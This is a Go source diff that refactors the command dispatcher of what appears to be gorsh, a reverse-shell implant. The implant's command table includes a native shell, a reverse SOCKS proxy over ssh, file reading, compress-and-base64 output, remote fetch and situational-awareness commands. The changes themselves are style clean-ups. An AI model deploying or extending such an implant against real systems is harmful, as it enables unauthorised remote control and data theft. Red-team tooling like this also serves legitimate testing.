@@ -14,121 +14,122 @@ import (
 	"github.com/audibleblink/gorsh/internal/zip"
 )
 
-type CmdFunc func(...string) string
+type cmdFunc func(...string) string
 
-type Command struct {
+type command struct {
 	Name     string
 	ArgHint  string
 	Desc     string
 	ArgCount int
 	ArgReq   bool
-	cmdFn    CmdFunc
+	cmdFn    cmdFunc
 }
 
-func (c *Command) Help() string {
+func (c *command) Help() string {
 	return fmt.Sprintf("%-6s %-12s %s  %s\n", c.Name, c.ArgHint, "|", c.Desc)
 }
 
-func (c *Command) Execute(argv []string) string {
+func (c *command) Execute(argv []string) string {
 	var output string
 	output = c.cmdFn(argv...)
 	return output
 }
 
-var Commands []*Command
+var commands []*command
 
 func init() {
-	Commands = []*Command{
-		&Command{
-			"shell",
-			"",
-			"Drops into a native shell. Mind you OPSEC",
-			0,
-			false,
-			nil},
-		&Command{
-			"socks",
-			"<port>",
-			"Create a reverse SOCKS proxy on <port> over ssh",
-			1,
-			true,
-			socksFn},
-		&Command{
-			"cd",
-			"[path]",
-			"Change the process' working directory",
-			1,
-			false,
-			cdFn},
-		&Command{
-			"ls",
-			"[path]",
-			"List the current working directory",
-			1,
-			false,
-			lsFn},
-		&Command{
-			"pwd",
-			"",
-			"Print the current working directory",
-			0,
-			false,
-			pwdFn},
-		&Command{
-			"ps",
-			"",
-			"Print process information",
-			0,
-			false,
-			psFn},
-		&Command{
-			"cat",
-			"<file>",
-			"Print the contents of the given file",
-			1,
-			true,
-			catFn},
-		&Command{
-			"zipcat",
-			"<file>",
-			"Compress, base64, and print the given file",
-			1,
-			true,
-			zipcatFn},
-		&Command{
-			"base64",
-			"<file>",
-			"Base64 encode the given file and print",
-			1,
-			true,
-			base64Fn},
-		&Command{
-			"fetch",
-			"<URI> <file>",
-			"Fetch stuff. http[s]:// or //share/folder (Windows only)",
-			2,
-			true,
-			fetchFn},
-		&Command{
-			"sitrep",
-			"",
-			"Situation Awareness information",
-			0,
-			false,
-			sitrepFn},
-		&Command{
-			"help",
-			"",
-			"Print this help menu",
-			0,
-			false,
-			helpFn}}
+	commands = []*command{
+		&command{
+			Name:     "shell",
+			ArgHint:  "",
+			Desc:     "Drops into a native shell. Mind you OPSEC",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    nil},
+		&command{
+			Name:     "socks",
+			ArgHint:  "<port>",
+			Desc:     "Create a reverse SOCKS proxy on <port> over ssh",
+			ArgCount: 1,
+			ArgReq:   true,
+			cmdFn:    socksFn},
+		&command{
+			Name:     "cd",
+			ArgHint:  "[path]",
+			Desc:     "Change the process' working directory",
+			ArgCount: 1,
+			ArgReq:   false,
+			cmdFn:    cdFn},
+		&command{
+			Name:     "ls",
+			ArgHint:  "[path]",
+			Desc:     "List the current working directory",
+			ArgCount: 1,
+			ArgReq:   false,
+			cmdFn:    lsFn},
+		&command{
+			Name:     "pwd",
+			ArgHint:  "",
+			Desc:     "Print the current working directory",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    pwdFn},
+		&command{
+			Name:     "ps",
+			ArgHint:  "",
+			Desc:     "Print process information",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    psFn},
+		&command{
+			Name:     "cat",
+			ArgHint:  "<file>",
+			Desc:     "Print the contents of the given file",
+			ArgCount: 1,
+			ArgReq:   true,
+			cmdFn:    catFn},
+		&command{
+			Name:     "zipcat",
+			ArgHint:  "<file>",
+			Desc:     "Compress, base64, and print the given file",
+			ArgCount: 1,
+			ArgReq:   true,
+			cmdFn:    zipcatFn},
+		&command{
+			Name:     "base64",
+			ArgHint:  "<file>",
+			Desc:     "Base64 encode the given file and print",
+			ArgCount: 1,
+			ArgReq:   true,
+			cmdFn:    base64Fn},
+		&command{
+			Name:     "fetch",
+			ArgHint:  "<URI> <file>",
+			Desc:     "Fetch stuff. http[s]:// or //share/folder (Windows only)",
+			ArgCount: 2,
+			ArgReq:   true,
+			cmdFn:    fetchFn},
+		&command{
+			Name:     "sitrep",
+			ArgHint:  "",
+			Desc:     "Situation Awareness information",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    sitrepFn},
+		&command{
+			Name:     "help",
+			ArgHint:  "",
+			Desc:     "Print this help menu",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    helpFn}}
 }
 
+// Route handles the argv input and dispatches to the propper function
 func Route(argv []string) string {
 	cmd := _find(argv[0])
 	if cmd == nil {
-		return "Command not found. Try 'help' for a list of available commands"
+		return "command not found. Try 'help' for a list of available commands"
 	}
 
 	if cmd.ArgReq && cmd.ArgCount != len(argv)-1 {
@@ -139,6 +140,7 @@ func Route(argv []string) string {
 	return output
 }
 
+// Command functions
 func socksFn(argv ...string) string {
 	socks.ListenAndForward(argv[1])
 	return "OK."
@@ -188,20 +190,18 @@ func zipcatFn(file ...string) string {
 	bytes, err := zip.Bytes(file[1])
 	if err != nil {
 		return err.Error()
-	} else {
-		b64 := base64.StdEncoding.EncodeToString(bytes)
-		return b64
 	}
+	b64 := base64.StdEncoding.EncodeToString(bytes)
+	return b64
 }
 
 func base64Fn(file ...string) string {
 	bytes, err := ioutil.ReadFile(file[1])
 	if err != nil {
 		return err.Error()
-	} else {
-		b64 := base64.StdEncoding.EncodeToString(bytes)
-		return b64
 	}
+	b64 := base64.StdEncoding.EncodeToString(bytes)
+	return b64
 }
 
 func fetchFn(file ...string) string {
@@ -221,23 +221,18 @@ func sitrepFn(argv ...string) string {
 
 func helpFn(args ...string) string {
 	var output string
-	for _, cmd := range Commands {
+	for _, cmd := range commands {
 		output += fmt.Sprintf(cmd.Help())
 	}
 	return output
 }
 
-func _find(cmd string) *Command {
-	var outCmd *Command
-	for _, c := range Commands {
+func _find(cmd string) *command {
+	var outCmd *command
+	for _, c := range commands {
 		if cmd == c.Name {
 			outCmd = c
 		}
 	}
 	return outCmd
 }
-
-// switch argv[0] {
-// case "shell":
-// 	Send(conn, "Mind your OPSEC")
-// 	RunShell(conn)
